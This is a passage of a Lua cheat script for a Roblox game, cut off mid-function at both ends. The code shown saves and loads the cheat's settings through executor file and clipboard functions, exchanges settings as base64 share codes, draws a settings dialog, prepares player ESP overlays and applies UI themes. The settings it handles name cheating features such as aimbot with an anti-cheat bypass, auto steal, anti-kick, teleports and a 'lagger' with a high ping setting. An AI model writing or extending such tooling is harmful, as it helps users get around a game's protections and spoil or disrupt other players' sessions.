            M.mobBtnBgId = tonumber(d.mobBtnBgId)
        else
            M.mobBtnBgId = M.DEFAULT_MOB_BTN_BG_ID or 92132591931954
        end
        if d.autoBat~=nil then M.autoBatEnabled=d.autoBat end
        M.aimbotRotationEnabled = true 
        if d.aimbotCameraRotation~=nil then M.aimbotCameraRotation=d.aimbotCameraRotation~=false end
        if d.semiHoldMin then M.Semi.holdMin=d.semiHoldMin end
        if d.semiHoldMax then M.Semi.holdMax=d.semiHoldMax end
        if d.semiEntryDelay then M.Semi.entryDelay=d.semiEntryDelay end
        if d.semiPrimeRange then M.Semi.primeRange=d.semiPrimeRange end
        if type(d.semiRadius)=="number" then M.Semi.radius=math.min(d.semiRadius, 10) end
        if d.lineESPEnabled~=nil then M.lineESPEnabled=d.lineESPEnabled end
        if d.menuOpen~=nil then M.menuOpen=d.menuOpen~=false end
        
        do
            local tn = nil
            if type(d.Theme)=="string" and CHERRY_THEMES[d.Theme] then tn = d.Theme end
            if type(d.colorScheme)=="string" and CHERRY_THEMES[d.colorScheme] then tn = d.colorScheme end
            if tn == "Default" then tn = "Red" elseif tn == "Forest" then tn = "Green" end
            if tn and CHERRY_THEMES[tn] then
                M._savedTheme = tn
                M.colorScheme = tn
                CherryConfig.Theme = tn
            end
        end
        if d.speedESPEnabled~=nil then M.speedESPEnabled=d.speedESPEnabled end
        M.autoResetOnDeath = false 
        if type(d.animPack)=="string" then M.animPack=d.animPack end
        if d.headlessEnabled~=nil then M.headlessEnabled=d.headlessEnabled end
        if d.korbloxEnabled~=nil then M.korbloxEnabled=d.korbloxEnabled end
        if type(d.customAccessoryIds)=="table" then
            M.customAccessoryIds = {}
            for _, id in ipairs(d.customAccessoryIds) do
                local n = tonumber(id)
                if n and n > 0 then table.insert(M.customAccessoryIds, n) end
            end
        end
        if type(d.presetAccessoryOn)=="table" then
            M.presetAccessoryOn = {}
            for k, v in pairs(d.presetAccessoryOn) do
                M.presetAccessoryOn[tostring(k)] = v and true or false
            end
        end
        if d.skinKeepOnRespawn~=nil then M.skinKeepOnRespawn = d.skinKeepOnRespawn ~= false end
        if type(d.customShirtId)=="number" then M.customShirtId = d.customShirtId
        elseif d.customShirtId == false or d.customShirtId == nil then M.customShirtId = nil end
        if type(d.customPantsId)=="number" then M.customPantsId = d.customPantsId
        elseif d.customPantsId == false or d.customPantsId == nil then M.customPantsId = nil end
        if type(d.bodySkinPreset)=="string" then M.bodySkinPreset = d.bodySkinPreset end
        if type(d.bodySkinCustomRGB)=="table" then
            M.bodySkinCustomRGB = {
                tonumber(d.bodySkinCustomRGB[1]) or 163,
                tonumber(d.bodySkinCustomRGB[2]) or 162,
                tonumber(d.bodySkinCustomRGB[3]) or 165,
            }
        end
        if d.bypassAimbotEnabled~=nil then M.bypassAimbotEnabled=d.bypassAimbotEnabled end
        M.tpBatSureHitEnabled = true 
        if d.bodyLockEnabled~=nil then M.bodyLockEnabled=d.bodyLockEnabled end
        if type(d.bodyLockRadius)=="number" then M.bodyLockRadius=d.bodyLockRadius end
        if d.hardHitEnabled~=nil then M.hardHitEnabled=d.hardHitEnabled end
        if type(d.hardHitRadius)=="number" then M.hardHitRadius=d.hardHitRadius end
        if d.ultraModeEnabled~=nil then M.ultraModeEnabled=d.ultraModeEnabled end
        M.antiDesyncPanelOpen = false 
        if d.musicPanelOpen~=nil then M.musicPanelOpen=d.musicPanelOpen==true end
        if d.pingPanelOpen~=nil then M.pingPanelOpen=d.pingPanelOpen==true end
        if type(d.pingPower)=="number" then M.pingPower=d.pingPower end
        if type(d.pingInterval)=="number" then M.pingInterval=d.pingInterval end
        if type(d.vynxLaggerLevel)=="string" and (d.vynxLaggerLevel=="Low" or d.vynxLaggerLevel=="Mid" or d.vynxLaggerLevel=="High") then
            M.vynxLaggerLevel = d.vynxLaggerLevel
        end
        if d.vynxLaggerPanelOpen~=nil then M.vynxLaggerPanelOpen=d.vynxLaggerPanelOpen==true end
        if type(d.vynxLaggerKeybindKb)=="string" then M.vynxLaggerKeybindKb=d.vynxLaggerKeybindKb end
        if type(d.pingKeybindKb)=="string" then M.pingKeybindKb=d.pingKeybindKb end
        if type(d.pingKeybindGp)=="string" then M.pingKeybindGp=d.pingKeybindGp end
        if d.pingAutoBrainrot~=nil then M.pingAutoBrainrot=d.pingAutoBrainrot~=false end
        if d.musicLastTrackId~=nil then M.musicLastTrackId=d.musicLastTrackId end
        if type(d.musicVolume)=="number" then M.musicVolume=math.clamp(d.musicVolume,0,1) end
        if d.musicWasPlaying~=nil then M.musicWasPlaying=d.musicWasPlaying==true end
        if type(d.musicPanelPos)=="table" then M.musicPanelPos=d.musicPanelPos end
        if type(d.menuPos)=="table" then M.menuPos=d.menuPos end
        if type(d.btnPos)=="table" then M._btnPosCache=d.btnPos end
        if type(d.pingPanelPos)=="table" then M.pingPanelPos=d.pingPanelPos end
        if type(d.vynxLaggerPanelPos)=="table" then M.vynxLaggerPanelPos=d.vynxLaggerPanelPos end
        if d.antiDesyncShield~=nil then M.antiDesyncShield=d.antiDesyncShield==true end
        if d.antiDesyncVelocity~=nil then M.antiDesyncVelocity=d.antiDesyncVelocity==true end
        if d.animPackEnabled~=nil then M.animPackEnabled=d.animPackEnabled end
        local function lk(e,d2)
            if type(d2)~="table" then return end
            if d2.kb and Enum.KeyCode[d2.kb] then e.kb=Enum.KeyCode[d2.kb] else e.kb=nil end
            if d2.gp and Enum.KeyCode[d2.gp] then e.gp=Enum.KeyCode[d2.gp] else e.gp=nil end
        end
        if d.dropBrainrotKey then lk(M.KB.DropBrainrot,d.dropBrainrotKey) end
        if d.autoLeftKey then lk(M.KB.AutoLeft,d.autoLeftKey) end
        if d.autoRightKey then lk(M.KB.AutoRight,d.autoRightKey) end
        if d.autoBatKey then lk(M.KB.AutoBat,d.autoBatKey) end
        if d.laggerToggleKey then lk(M.KB.LaggerToggle,d.laggerToggleKey) end
        if d.laggerCarryKey then lk(M.KB.LaggerCarry,d.laggerCarryKey) end
        if d.tpFloorKey then lk(M.KB.TPFloor,d.tpFloorKey) end
        if d.guiHideKey then lk(M.KB.GuiHide,d.guiHideKey) end
        if d.speedToggleKey then lk(M.KB.SpeedToggle,d.speedToggleKey) end
        if d.bypassAimbotKey then lk(M.KB.BypassAimbot,d.bypassAimbotKey) end
        if d.bodyLockKey then lk(M.KB.BodyLock,d.bodyLockKey) end
    end
end

local function saveCherryConfig()
    if type(writefile)~="function" then return end
    local function ks(e)
        if type(e) ~= "table" then return {kb=nil,gp=nil} end
        return {
            kb = (e.kb and e.kb.Name) or nil,
            gp = (e.gp and e.gp.Name) or nil,
        }
    end
    local cfg = {
        Theme=(M._savedTheme or M.colorScheme or CherryConfig.Theme or "White"), colorScheme=(M.colorScheme or M._savedTheme or CherryConfig.Theme or "White"), menuOpen=M.menuOpen~=false,
        normalSpeed=M.NS, carrySpeed=M.CS, laggerSpeed=M.LAGGER_SPEED,
        laggerCarrySpeed=M.LAGGER_CARRY_SPEED, speedMethod=M.speedMethod, grabRadius=M.Steal.StealRadius,
        stealDuration=M.Steal.StealDuration, stealStopTime=M.Steal.StopTime, stealMode=M.stealMode,
        autoTPHeight=M.autoTPHeight, fovValue=M.fovValue, uiScale=M.uiScale,
        infJumpMode=M.infJumpMode,
        mobileButtonsSize=M.mobileButtonsSize, skyTheme=M.currentSkyTheme,
        customBgId=tonumber(M.customBgId) or 0, customBgOpacity=tonumber(M.customBgOpacity) or 0.35,
        mobBtnBgId=tonumber(M.mobBtnBgId) or 0,
        stealBarSize=M.stealBarSize,
        carrySpeedActive=((M.speedUIMode or "Original")=="Original") and (M.carrySpeedActive==true) or false, laggerModeEnabled=((M.speedUIMode or "Original")=="Original") and (M.laggerModeEnabled==true) or false, speedBoosterEnabled=M.speedBoosterEnabled~=false, speedBoosterPath=M.speedBoosterPath or "Normal", speedBoosterPanelOpen=M.speedBoosterPanelOpen~=false, speedUIMode=M.speedUIMode or "Original", speedBoosterPos=M.speedBoosterPos,
        autoSwing=M.autoSwingEnabled, aimbotSpeed=M.aimbotSpeed, introSoundEnabled=M.introSoundEnabled,
        
        introGUIEnabled=M.introGUIEnabled,
        ragdollGui=M.ragdollGuiEnabled, circleButtonsEnabled=M.circleButtonsEnabled, mobileButtonShape=M.mobileButtonShape or "Normal",
        perButtonDrag=M.perButtonDragEnabled, mobileButtonsEnabled=M.mobileButtonsEnabled,
        medusaReset=false, medusaResetDelay=M.medusaResetDelay, autoMoveSwing=M.autoMoveSwingEnabled,
        autoSwitchSpeed=M.autoSwitchSpeedEnabled, autoTurnOffSpeed=M.autoTurnOffSpeedEnabled, autoSwitchLaggerSpeed=M.autoSwitchLaggerSpeedEnabled, autoCarryEnemyBase=M.autoCarryEnemyBaseEnabled, autoCarryEnemyBaseRange=M.autoCarryEnemyBaseRange, customFont=M.customFontSelected, showPlayerSpeeds=M.showPlayerSpeeds,
        removeAcc=M.removeAccEnabled,
        playerESPEnabled=M.playerESPEnabled,
        autoStealEnabled=M.Steal.AutoStealEnabled,
        autoRadiusEnabled=M.autoRadiusEnabled,
        antiRagdoll=M.antiRagdollEnabled, antiRagdollMode=M.antiRagdollMode, ragdollTPBase=M.ragdollTPBaseEnabled==true, ragdollTPBaseRange=tonumber(M.ragdollTPBaseRange) or 50, infiniteJump=M.infJumpEnabled,
        medusaCounter=M.medusaCounterEnabled, batCounter=M.batCounterEnabled,
        unwalkEnabled=M.unwalkEnabled, antiLag=M.antiLagEnabled, nukeOptEnabled=M.nukeOptEnabled==true, antiSummerBase=M.antiSummerBaseEnabled, uiLocked=M.uiLocked,
        stretchRez=M.stretchRezEnabled, autoTPEnabled=M.autoTPEnabled,
        antiKick=M.antiKickEnabled, antiDie=M.antiDieEnabled==true, antiFling=M.antiFlingEnabled~=false, safeMode=M.safeModeEnabled, mirrorTPDown=M.mirrorTPDownEnabled, autoBat=M.autoBatEnabled, aimbotRotationEnabled=M.aimbotRotationEnabled~=false, aimbotCameraRotation=M.aimbotCameraRotation~=false, tpBatSureHit=M.tpBatSureHitEnabled==true,
        bodyLockEnabled=M.bodyLockEnabled, bodyLockRadius=M.bodyLockRadius,
        hardHitEnabled=M.hardHitEnabled, hardHitRadius=M.hardHitRadius, ultraModeEnabled=M.ultraModeEnabled, antiDesyncPanelOpen=M.antiDesyncPanelOpen, antiDesyncShield=M.antiDesyncShield, antiDesyncVelocity=M.antiDesyncVelocity, musicPanelOpen=M.musicPanelOpen,
        pingPanelOpen=M.pingPanelOpen==true,
        pingPower=tonumber(M.pingPower) or 100000,
        pingInterval=tonumber(M.pingInterval) or 0.125,
        vynxLaggerPanelOpen=M.vynxLaggerPanelOpen==true,
        vynxLaggerLevel=M.vynxLaggerLevel or "Mid",
        vynxLaggerKeybindKb=M.vynxLaggerKeybindKb or "V",
        pingKeybindKb=M.pingKeybindKb or "F",
        pingKeybindGp=M.pingKeybindGp or "ButtonR2",
        pingAutoBrainrot=M.pingAutoBrainrot~=false,
        musicLastTrackId=M.musicLastTrackId, musicVolume=tonumber(M.musicVolume) or 0.8, musicWasPlaying=M.musicWasPlaying==true, musicPanelPos=M.musicPanelPos, menuPos=M.menuPos, pingPanelPos=M.pingPanelPos, vynxLaggerPanelPos=M.vynxLaggerPanelPos, btnPos=M._btnPosCache,
        semiHoldMin=M.Semi.holdMin, semiHoldMax=M.Semi.holdMax,
        semiEntryDelay=M.Semi.entryDelay,
        semiPrimeRange=M.Semi.primeRange,
        semiRadius=math.min(M.Semi.radius, 10),
        lineESPEnabled=M.lineESPEnabled,
        speedESPEnabled=M.speedESPEnabled,
        autoResetOnDeath=false,
        animPack=M.animPack,
        headlessEnabled=M.headlessEnabled,
        korbloxEnabled=M.korbloxEnabled,
        customAccessoryIds=M.customAccessoryIds or {},
        presetAccessoryOn=M.presetAccessoryOn or {},
        skinKeepOnRespawn=M.skinKeepOnRespawn ~= false,
        customShirtId=M.customShirtId,
        customPantsId=M.customPantsId,
        bodySkinPreset=M.bodySkinPreset or "None",
        bodySkinCustomRGB=M.bodySkinCustomRGB or {163,162,165},
        bypassAimbotEnabled=M.bypassAimbotEnabled,
        animPackEnabled=M.animPackEnabled,
        dropBrainrotKey=ks(M.KB.DropBrainrot), autoLeftKey=ks(M.KB.AutoLeft),
        autoRightKey=ks(M.KB.AutoRight), autoBatKey=ks(M.KB.AutoBat),
        bodyLockKey=ks(M.KB.BodyLock),
        laggerToggleKey=ks(M.KB.LaggerToggle), laggerCarryKey=ks(M.KB.LaggerCarry), tpFloorKey=ks(M.KB.TPFloor),
        guiHideKey=ks(M.KB.GuiHide),
        speedToggleKey=ks(M.KB.SpeedToggle), bypassAimbotKey=ks(M.KB.BypassAimbot),
    }
    pcall(function() writefile(CHERRY_CONFIG_NAME, HS:JSONEncode(cfg)) end)
end

M.saveConfig = saveCherryConfig




local function _vynxB64Enc(data)
    local b = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
    return ((data:gsub(".", function(x)
        local r, byte = "", x:byte()
        for i = 8, 1, -1 do
            r = r .. (byte % 2 ^ i - byte % 2 ^ (i - 1) > 0 and "1" or "0")
        end
        return r
    end) .. "0000"):gsub("%d%d%d?%d?%d?%d?", function(x)
        if #x < 6 then return "" end
        local c = 0
        for i = 1, 6 do
            c = c + (x:sub(i, i) == "1" and 2 ^ (6 - i) or 0)
        end
        return b:sub(c + 1, c + 1)
    end) .. ({ "", "==", "=" })[#data % 3 + 1])
end

local function _vynxB64Dec(data)
    local b = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
    data = string.gsub(data, "[^" .. b .. "=]", "")
    return (data:gsub(".", function(x)
        if x == "=" then return "" end
        local r, f = "", (b:find(x) - 1)
        for i = 6, 1, -1 do
            r = r .. (f % 2 ^ i - f % 2 ^ (i - 1) > 0 and "1" or "0")
        end
        return r
    end):gsub("%d%d%d?%d?%d?%d?%d?%d?", function(x)
        if #x ~= 8 then return "" end
        local c = 0
        for i = 1, 8 do
            c = c + (x:sub(i, i) == "1" and 2 ^ (8 - i) or 0)
        end
        return string.char(c)
    end))
end

function M.collectSharePayload()
    
    pcall(saveCherryConfig)
    local cfg = {}
    
    local ok, disk = pcall(function()
        if isfile and isfile("CherryConfig.json") then
            return HS:JSONDecode(readfile("CherryConfig.json"))
        end
    end)
    if ok and type(disk) == "table" then
        cfg = disk
    end
    
    local btnPos = {}
    pcall(function()
        if M.mobGuiRef then
            for _, child in ipairs(M.mobGuiRef:GetDescendants()) do
                if child:IsA("TextButton") and child:GetAttribute("BtnKey") then
                    local key = child:GetAttribute("BtnKey")
                    btnPos[key] = { x = child.Position.X.Offset, y = child.Position.Y.Offset }
                end
            end
        elseif isfile and isfile(M.MOB_POS_FILE) then
            local ok2, data = pcall(function() return HS:JSONDecode(readfile(M.MOB_POS_FILE)) end)
            if ok2 and type(data) == "table" then btnPos = data end
        end
    end)
    cfg._btnPos = btnPos
    cfg._shareVer = 1
    cfg._shareTag = "VYNX"
    return cfg
end

function M.exportShareCode()
    local payload = M.collectSharePayload()
    local json = HS:JSONEncode(payload)
    local code = "VYNX1:" .. _vynxB64Enc(json)
    return code
end

function M.applySharePayload(d)
    if type(d) ~= "table" then return false, "invalid payload" end
    
    pcall(function()
        if writefile then
            writefile("CherryConfig.json", HS:JSONEncode(d))
        end
    end)
    
    if type(d._btnPos) == "table" and writefile then
        pcall(function()
            writefile(M.MOB_POS_FILE, HS:JSONEncode(d._btnPos))
        end)
    end
    
    pcall(loadCherryConfig)
    
    pcall(function()
        M.menuOpen = true
        M.buildGui()
    end)
    if M.mobileButtonsEnabled then
        pcall(function() M.buildMobileButtons() end)
    end
    pcall(function()
        if false and (M.musicPanelOpen or M.musicWasPlaying) then
        end
    end)
    
    pcall(function()
        if M.Steal and M.Steal.AutoStealEnabled then M.startAutoSteal() else M.stopAutoSteal() end
        if M.infJumpEnabled then
            M.infJumpMode = "hold"; M.startHoldInfJump()
        end
        if M.antiRagdollEnabled then M.startAntiRagdoll() end
        if M.antiKickEnabled then M.enableAntiKick() end
        M.antiDieEnabled = true; pcall(M.startAntiDie)
M.antiFlingEnabled = true; pcall(function() M.startAntiFling() end)
        if M.autoTPEnabled then M.startAutoTP() end
        if M.hardHitEnabled then M.startHardHit() end
        if M.ultraModeEnabled then M.enableUltraMode() end
        if M.mirrorTPDownEnabled then pcall(function() M.setMirrorTPDown(true) end) end
        if M.CandyApplyCustomSky then M.CandyApplyCustomSky(M.currentSkyTheme) end
        if M.applyFOV then M.applyFOV() end
    end)
    pcall(saveCherryConfig)
    return true, "loaded"
end

function M.importShareCode(code)
    if type(code) ~= "string" then return false, "empty" end
    code = code:gsub("%s+", "")
    if code:sub(1, 6) == "VYNX1:" then
        code = code:sub(7)
    end
    local ok, json = pcall(function() return _vynxB64Dec(code) end)
    if not ok or not json or json == "" then
        return false, "decode failed"
    end
    local ok2, data = pcall(function() return HS:JSONDecode(json) end)
    if not ok2 or type(data) ~= "table" then
        return false, "bad json"
    end
    return M.applySharePayload(data)
end

function M.copyShareToClipboard()
    local code = M.exportShareCode()
    local copied = false
    pcall(function()
        if setclipboard then setclipboard(code); copied = true end
    end)
    if not copied then
        pcall(function()
            if toclipboard then toclipboard(code); copied = true end
        end)
    end
    if not copied then
        pcall(function()
            if set_clipboard then set_clipboard(code); copied = true end
        end)
    end
    return code, copied
end

function M.openLoadSettingsPrompt()
    local old = player.PlayerGui:FindFirstChild("VynxLoadSettings")
    if old then old:Destroy() end
    local cg = game:GetService("CoreGui"):FindFirstChild("VynxLoadSettings")
    if cg then pcall(function() cg:Destroy() end) end

    local gui = Instance.new("ScreenGui")
    gui.Name = "VynxLoadSettings"
    gui.ResetOnSpawn = false
    gui.IgnoreGuiInset = true
    gui.DisplayOrder = 200
    gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    pcall(function() gui.Parent = game:GetService("CoreGui") end)
    if not gui.Parent then gui.Parent = player:WaitForChild("PlayerGui") end

    local dim = Instance.new("TextButton")
    dim.Size = UDim2.fromScale(1, 1)
    dim.BackgroundColor3 = Color3.new(0, 0, 0)
    dim.BackgroundTransparency = 0.4
    dim.Text = ""
    dim.AutoButtonColor = false
    dim.Parent = gui
    dim.MouseButton1Click:Connect(function() gui:Destroy() end)

    local panel = Instance.new("Frame")
    panel.Size = UDim2.fromOffset(340, 220)
    panel.Position = UDim2.new(0.5, -170, 0.5, -110)
    panel.BackgroundColor3 = Color3.fromRGB(12, 12, 16)
    panel.BorderSizePixel = 0
    panel.Parent = gui
    Instance.new("UICorner", panel).CornerRadius = UDim.new(0, 12)
    local st = Instance.new("UIStroke", panel)
    st.Color = Color3.fromRGB(255, 255, 255)
    st.Transparency = 0.5

    local title = Instance.new("TextLabel", panel)
    title.Size = UDim2.new(1, -20, 0, 28)
    title.Position = UDim2.new(0, 12, 0, 10)
    title.BackgroundTransparency = 1
    title.Text = "LOAD SETTINGS CODE"
    title.TextColor3 = Color3.fromRGB(255, 255, 255)
    title.Font = Enum.Font.GothamBold
    title.TextSize = 14
    title.TextXAlignment = Enum.TextXAlignment.Left

    local box = Instance.new("TextBox", panel)
    box.Size = UDim2.new(1, -24, 0, 100)
    box.Position = UDim2.new(0, 12, 0, 44)
    box.BackgroundColor3 = Color3.fromRGB(28, 28, 34)
    box.Text = ""
    box.PlaceholderText = "Paste VYNX1:... code here"
    box.TextColor3 = Color3.fromRGB(230, 230, 235)
    box.PlaceholderColor3 = Color3.fromRGB(120, 120, 130)
    box.Font = Enum.Font.Code
    box.TextSize = 11
    box.TextWrapped = true
    box.ClearTextOnFocus = false
    box.MultiLine = true
    box.TextXAlignment = Enum.TextXAlignment.Left
    box.TextYAlignment = Enum.TextYAlignment.Top
    Instance.new("UICorner", box).CornerRadius = UDim.new(0, 8)

    local status = Instance.new("TextLabel", panel)
    status.Size = UDim2.new(1, -24, 0, 18)
    status.Position = UDim2.new(0, 12, 1, -58)
    status.BackgroundTransparency = 1
    status.Text = ""
    status.TextColor3 = Color3.fromRGB(180, 180, 190)
    status.Font = Enum.Font.GothamMedium
    status.TextSize = 11
    status.TextXAlignment = Enum.TextXAlignment.Left

    local loadBtn = Instance.new("TextButton", panel)
    loadBtn.Size = UDim2.new(0.5, -16, 0, 32)
    loadBtn.Position = UDim2.new(0, 12, 1, -42)
    loadBtn.BackgroundColor3 = Color3.fromRGB(220, 220, 230)
    loadBtn.Text = "LOAD"
    loadBtn.TextColor3 = Color3.fromRGB(10, 10, 12)
    loadBtn.Font = Enum.Font.GothamBold
    loadBtn.TextSize = 13
    Instance.new("UICorner", loadBtn).CornerRadius = UDim.new(0, 8)

    local cancelBtn = Instance.new("TextButton", panel)
    cancelBtn.Size = UDim2.new(0.5, -16, 0, 32)
    cancelBtn.Position = UDim2.new(0.5, 4, 1, -42)
    cancelBtn.BackgroundColor3 = Color3.fromRGB(40, 40, 48)
    cancelBtn.Text = "CANCEL"
    cancelBtn.TextColor3 = Color3.fromRGB(220, 220, 230)
    cancelBtn.Font = Enum.Font.GothamBold
    cancelBtn.TextSize = 13
    Instance.new("UICorner", cancelBtn).CornerRadius = UDim.new(0, 8)

    cancelBtn.MouseButton1Click:Connect(function() gui:Destroy() end)
    loadBtn.MouseButton1Click:Connect(function()
        local code = box.Text or ""
        local ok, err = M.importShareCode(code)
        if ok then
            status.Text = "Loaded successfully!"
            status.TextColor3 = Color3.fromRGB(120, 255, 160)
            task.delay(0.7, function() if gui then gui:Destroy() end end)
        else
            status.Text = "Failed: " .. tostring(err or "unknown")
            status.TextColor3 = Color3.fromRGB(255, 120, 120)
        end
    end)
end





local RunService2 = game:GetService("RunService")
local cherryESPState = { LineESP=false, SpeedESP=false }
local cherryESPObjects = {}
local DrawingAvailable = false
pcall(function() DrawingAvailable = Drawing and type(Drawing.new)=="function" end)

local function cherryRemoveESP(p)
    local r = cherryESPObjects[p]
    if not r then return end
    for _,o in pairs(r) do pcall(function()
        if typeof(o)=="Instance" then o:Destroy()
        elseif o.Remove then o:Remove() end
    end) end
    cherryESPObjects[p]=nil
end

local function cherryGetSpeed(root)
    local v
    pcall(function() v=root.AssemblyLinearVelocity end)
    if not v then pcall(function() v=root.Velocity end) end
    if not v then return 0 end
    return Vector3.new(v.X,0,v.Z).Magnitude
end

local function cherryCreateESP(p)
    if cherryESPObjects[p] then return cherryESPObjects[p] end
    local r={}
    local hl=Instance.new("Highlight")
    hl.FillTransparency=1; hl.OutlineTransparency=0
    hl.DepthMode=Enum.HighlightDepthMode.AlwaysOnTop
    hl.Enabled=false; hl.Parent=workspace
    r.Highlight=hl
    local bb=Instance.new("BillboardGui")
    bb.Size=UDim2.fromOffset(150,32); bb.StudsOffset=Vector3.new(0,3.25,0)
    bb.AlwaysOnTop=true; bb.Enabled=false; bb.ResetOnSpawn=false
    bb.Parent=player:WaitForChild("PlayerGui")
    local sl=Instance.new("TextLabel",bb)
    sl.Size=UDim2.fromScale(1,1); sl.BackgroundTransparency=1; sl.Text="0.0 spd"
    sl.TextStrokeColor3=Color3.new(0,0,0); sl.TextStrokeTransparency=0
    sl.Font=Enum.Font.GothamBlack; sl.TextSize=18
    sl.TextXAlignment=Enum.TextXAlignment.Center; sl.TextYAlignment=Enum.TextYAlignment.Center
    r.Billboard=bb; r.SpeedText=sl
    if DrawingAvailable then
        local ln=Drawing.new("Line")
        ln.Visible=false; ln.Thickness=2.75; ln.Transparency=1
        r.Line=ln
    end
    cherryESPObjects[p]=r
    return r
end

Players.PlayerRemoving:Connect(function(p) cherryRemoveESP(p) end)


local function themeDarkFromAccent(accent, amount)
    
    amount = math.clamp(tonumber(amount) or 0.12, 0, 1)
    return Color3.new(
        math.clamp(accent.R * amount, 0, 1),
        math.clamp(accent.G * amount, 0, 1),
        math.clamp(accent.B * amount, 0, 1)
    )
end

local function isNearBlack(c, threshold)
    if typeof(c) ~= "Color3" then return false end
    threshold = threshold or 0.14
    return c.R <= threshold and c.G <= threshold and c.B <= threshold
end

local function isPurpleishColor(c)
    if typeof(c) ~= "Color3" then return false end
    local r, g, b = c.R, c.G, c.B
    
    if b >= 0.45 and b >= r * 0.9 and b > g * 1.05 and (b - math.min(r, g)) >= 0.12 then
        return true
    end
    
    if b >= 0.7 and r >= 0.4 and g >= 0.35 and b > r and b > g and (b - g) >= 0.12 then
        return true
    end
    
    if b < 0.35 and r < 0.28 and g < 0.28 and b > r and b > g and (b - r) >= 0.02 and (b - g) >= 0.015 then
        return true
    end
    return false
end

local function mapPurpleishToAccent(c, accent, dim)
    if typeof(c) ~= "Color3" or typeof(accent) ~= "Color3" then return c end
    local lum = (c.R + c.G + c.B) / 3
    if lum < 0.22 then
        return themeDarkFromAccent(accent, math.clamp(lum * 1.35, 0.08, 0.28))
    elseif lum > 0.75 then
        return accent:Lerp(Color3.new(1, 1, 1), 0.35)
    else
        return accent:Lerp(dim or accent:Lerp(Color3.new(0, 0, 0), 0.35), 1 - lum)
    end
end

local function applyAccentFromTheme()
    local name = CherryConfig.Theme or M.colorScheme or M._savedTheme or "Default"
    if not CHERRY_THEMES[name] then name = "Default" end
    if name == "Default" then name = "Red"
    elseif name == "Forest" then name = "Green" end
    if not CHERRY_THEMES[name] then name = "Red" end
    CherryConfig.Theme = name
    M.colorScheme = name
    M._savedTheme = name
    local t = CHERRY_THEMES[name]
    local accent = t.Accent
    local dim = t.AccentDim or accent:Lerp(Color3.new(0,0,0), 0.35)

    local bg, row, btn, tog, gradTop, gradBot
    
    if name == "White" then
        accent = Color3.fromRGB(255, 255, 255)
        dim = Color3.fromRGB(180, 180, 190)
        bg  = Color3.fromRGB(0, 0, 0)
        row = Color3.fromRGB(14, 14, 16)
        btn = Color3.fromRGB(24, 24, 28)
        tog = Color3.fromRGB(40, 40, 46)
        gradTop = Color3.fromRGB(22, 22, 26)
        gradBot = Color3.fromRGB(6, 6, 8)
    else
        bg  = themeDarkFromAccent(accent, 0.10)
        row = themeDarkFromAccent(accent, 0.18)
        btn = themeDarkFromAccent(accent, 0.22)
        tog = themeDarkFromAccent(accent, 0.28)
        gradTop = themeDarkFromAccent(accent, 0.26)
        gradBot = themeDarkFromAccent(accent, 0.08)
    end

    CHERRY_ACCENT = accent
    UI_ACCENT = accent
    UI_ACCENT_DIM = dim
    UI_BG_DARK = bg
    UI_ROW_BG = row
    UI_BTN_BG = btn
    UI_TOGGLE_OFF = tog
    UI_TOGGLE_KNOB = Color3.fromRGB(200, 200, 210)
    UI_KNOB_ON = Color3.fromRGB(255, 255, 255)
    UI_TEXT_PRIMARY = Color3.fromRGB(255, 255, 255)
    UI_TEXT_WHITE = Color3.fromRGB(255, 255, 255)
    UI_TEXT_DIM = (name == "White") and Color3.fromRGB(200, 200, 210) or dim:Lerp(Color3.fromRGB(200,200,210), 0.4)
    UI_TEXT_SECTION = accent
    UI_CARD_STROKE = dim
    UI_GRAD_TOP = gradTop
    UI_GRAD_BOT = gradBot

    M.UI_ACCENT = accent
    if M.statusFill then pcall(function() M.statusFill.BackgroundColor3 = accent end) end
    M.UI_ACCENT_DIM = dim
    M.UI_BG_DARK = bg
    M.UI_ROW_BG = row
    M.UI_BTN_BG = btn
    M.Theme = {
        Name = name,
        Accent = accent,
        AccentDim = dim,
        Bg = bg,
        Row = row,
        Btn = btn,
    }
    M.UI_TOGGLE_OFF = tog
    M.UI_TOGGLE_KNOB = Color3.fromRGB(200, 200, 210)
    M.UI_KNOB_ON = Color3.fromRGB(255, 255, 255)
    M.UI_TEXT_PRIMARY = Color3.fromRGB(255, 255, 255)
    M.UI_TEXT_SECTION = accent
    M.UI_GRAD_TOP = gradTop
    M.UI_GRAD_BOT = gradBot
    M.UI_CARD_STROKE = dim
    pcall(function()
        if M.updateHeadTheme then M.updateHeadTheme() end
    end)
end


local function liveAccent()
    if M.Theme and M.Theme.Accent then return M.Theme.Accent end
    if M.UI_ACCENT then return M.UI_ACCENT end
    return UI_ACCENT or Color3.fromRGB(165, 75, 255)
end
local function liveToggleOff()
    return M.UI_TOGGLE_OFF or UI_TOGGLE_OFF or Color3.fromRGB(50, 50, 60)
end
local function liveKnobOn()
    return M.UI_KNOB_ON or UI_KNOB_ON or Color3.fromRGB(255, 255, 255)
end
local function liveKnobOff()
    return M.UI_TOGGLE_KNOB or UI_TOGGLE_KNOB or Color3.fromRGB(180, 180, 190)
end
local function liveRowBg()
    return (M.Theme and M.Theme.Row) or M.UI_ROW_BG or UI_ROW_BG or Color3.fromRGB(28, 28, 34)
end


function M.recolorBlacksToTheme(root)
    if not root then return end
    local accent = (M.Theme and M.Theme.Accent) or UI_ACCENT or M.UI_ACCENT or Color3.new(1,1,1)
    local dim = (M.Theme and M.Theme.AccentDim) or UI_ACCENT_DIM or M.UI_ACCENT_DIM or accent
    local bg = UI_BG_DARK or M.UI_BG_DARK or themeDarkFromAccent(accent, 0.10)
    local row = UI_ROW_BG or M.UI_ROW_BG or themeDarkFromAccent(accent, 0.18)
    local btn = UI_BTN_BG or M.UI_BTN_BG or themeDarkFromAccent(accent, 0.22)

    local function recolor(obj)
        
        if obj.Name == "Track" or obj.Name == "Fill" then
            return
        end
        local p = obj.Parent
        if p and p.Name == "Track" then return end

        if obj:IsA("GuiObject") then
            local ok, col = pcall(function() return obj.BackgroundColor3 end)
            if ok and typeof(col) == "Color3" then
                if isNearBlack(col) then
                    if obj:IsA("Frame") and (obj.Name == "Main" or obj.Name == "MainFrame" or obj.Name == "Frame" or obj.Size.X.Scale >= 0.9) then
                        obj.BackgroundColor3 = bg
                    elseif obj:IsA("TextButton") or obj:IsA("ImageButton") then
                        obj.BackgroundColor3 = btn
                    else
                        obj.BackgroundColor3 = row
                    end
                elseif isPurpleishColor(col) then
